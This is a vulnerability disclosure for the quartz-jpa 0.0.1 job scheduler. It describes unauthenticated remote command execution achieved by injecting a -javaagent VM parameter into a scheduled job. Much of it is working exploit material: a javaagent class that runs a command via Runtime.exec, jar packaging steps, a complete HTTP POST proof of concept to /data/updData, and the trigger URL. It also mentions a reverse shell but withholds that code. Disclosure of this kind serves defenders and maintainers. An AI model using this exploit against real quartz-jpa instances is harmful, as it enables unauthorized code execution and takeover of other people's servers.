### quartz-jpa javaagent command execution vulnerability

### Project Introduction 

quartz-jpa is used to regularly execute the compilation of jar packages under the specified path, and can also be used for ordinary task scheduling.

### project address

###  

https://github.com/fengcharly/quartz-jpa

### Vulnerability overview

###  

There is a command execution vulnerability in quartz-jpa. It can be accessed without authentication by default. By uploading a malicious jar package and triggering the execution of malicious code, the shell can be obtained.

### Affected version

0.0.1

### Vulnerability analysis

![img](https://cdn-images-1.medium.com/max/1080/0*L8gJ9GtcTsA1ffqq)

There are parameters under the route upStatus, which accept two parameters, one is boolean type start and the other is numeric type id. The implementation method of upStatus calling the service layer is as follows.

![img](https://cdn-images-1.medium.com/max/1080/0*dro0yKeMYUVctx8f)

First, get the corresponding jobEntity from the repository by id. Set a Status parameter. is OPEN or CLOSE. Obtain the corresponding job entity through id through getJobEntityById at the jobservice level. Access jobkey and map through entities. Map is the parameter of the class. Through some conditional code, the jobService.geJobDetail method is finally called at line 163 of src/main/java/com/example/quartsdemo/service/impl/DataServiceImpl.java to obtain the entity in jobDetail and finally pass the entity to scheduler.scheduleJob().

![img](https://cdn-images-1.medium.com/max/1080/0*ouufbREJXq7tc56L)

There is a command execution using processbuilder in src/main/java/com/example/quartsdemo/job/DynamicJob.java. Through the code logic, we found that the code verified the file and found that the jar file could be executed through the java -jar command. And there is an insertable parameter.

![img](https://cdn-images-1.medium.com/max/1080/0*sNbgPq0sjB7dvL1T)

Here we find that we can use the agent mechanism that comes with Java to execute arbitrary Java code. A modification and update task list repository is also needed here. An interface is found here. There is a call in the src/main/java/com/example/quartsdemo/controller/DataCotroller.java interface upData.

![img](https://cdn-images-1.medium.com/max/1080/0*9kFmuImlpa3eVYhx)

The implementation code is given directly here. Convert the job entity and save it in the repository.

![img](https://cdn-images-1.medium.com/max/1080/0*6bG9FjB5Jn-huYKJ)

### Vulnerability recurrence

访问http://127.0.0.1:9090，

![img](https://cdn-images-1.medium.com/max/1080/0*dXQuBMIjnb1VZmeR)

First construct a jar file composed of javaagent. Here is just one case. import java.lang.Runtime; import java.io.IOException; import java.lang.instrument.Instrumentation; public class Predemo { public static void premain(String args, Instrumentation inst) throws IOException { Runtime.getRuntime().exec(“ notepad”); } } MANIFEST.MF Manifest-Version: 1.0 Premain-Class: Predemo packages the compiled program. jar -mcf MANIFEST.MF 1.jar *.class

![img](https://cdn-images-1.medium.com/max/1080/0*BhrRm0B6PnpQQTly)

It can be found that a dangerous agent is executed through the javaagent jar.

![img](https://cdn-images-1.medium.com/max/1080/0*C5jhZXAJuhi3fUjb)

Rebound shell import java.lang.Runtime; import java.io.IOException; import java.lang.instrument.Instrumentation; public class Predemo { public static void premain(String args, Instrumentation inst) throws IOException { Rebound shell code has more code here I won’t post it} } Modify the path of the corresponding javaagent to the path of the rebound shell

![img](https://cdn-images-1.medium.com/max/1080/0*AVuIE9ovzMvBJ8Pg)

Rebound shell successful.

![img](https://cdn-images-1.medium.com/max/1080/0*fJJqKm6EFs4foq7K)

POC：

```
POST /data/updData HTTP/1.1 Host: localhost:9090 Content-Length: 326 Cache-Control: max-age=0 sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Windows" Upgrade-Insecure-Requests: 1 Origin: http://127.0.0.1:9090 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-Dest: iframe Referer: http://127.0.0.1:9090/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close id=1&name=first&group=helloworld&cron=0%2F10+*+*+*+*+%3F+&parameter=1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1&description=1&parameter=1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1&vmParam=-javaagent%3AC%3A%5Ctmp%5Cjar%5C2.jar&jarPath=C%3A%5Ctmp%5Cjar%5CCalc.jar&status=CLOSE
```

The id of jod updated here is 1, so the triggered request is

http://localhost:9090/data/updStatus?start=true&id=1

###  